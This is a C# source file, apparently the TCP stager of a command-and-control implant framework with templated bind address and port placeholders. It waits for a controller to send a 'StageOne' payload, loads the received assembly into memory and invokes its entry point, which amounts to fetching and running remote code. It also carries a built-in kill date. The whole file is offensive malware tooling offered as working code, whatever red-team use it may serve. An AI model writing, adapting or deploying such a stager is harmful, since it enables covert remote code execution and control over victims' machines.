using System;
using System.Reflection;

class AgentStager
{
    static StagerStatus StagerStatus = StagerStatus.Staging;

    static string AgentID;

    static readonly string BindAddress = "<<BindAddress>>";
    static readonly int BindPort = int.Parse("<<BindPort>>");

    static DateTime KillDate = DateTime.Parse("01/01/2030 00:00:00");

    public AgentStager()
    {
        Execute();
    }

    static void Main(string[] args)
    {
        new AgentStager();
    }

    public static void Execute()
    {
        AgentID = Misc.GeneratePseudoRandomString(8);

        var crypto = new CryptoController();

        try
        {
            var commModule = new TcpCommModule(AgentID, BindAddress, BindPort);
            commModule.Start(crypto);
            commModule.QueueStageRequest();

            while (StagerStatus == StagerStatus.Staging)
            {
                if (commModule.RecvData(out AgentMessage message))
                {
                    if (message.Data.Command.Equals("StageOne", StringComparison.OrdinalIgnoreCase))
                    {
                        StagerStatus = StagerStatus.Staged;
                        commModule.Stop();

                        var asm = Assembly.Load(message.Data.Data);
                        var type = asm.GetType("AgentStage");
                        var instance = Activator.CreateInstance(type);
                        type.InvokeMember(
                            "TcpEntryPoint",
                            BindingFlags.Public | BindingFlags.Static | BindingFlags.InvokeMethod,
                            null,
                            instance,
                            new object[] { AgentID, KillDate, BindAddress, BindPort });
                    }
                }
            }
        }
        catch (Exception e)
        {
            Console.Error.WriteLine(e.StackTrace);
        }
    }
}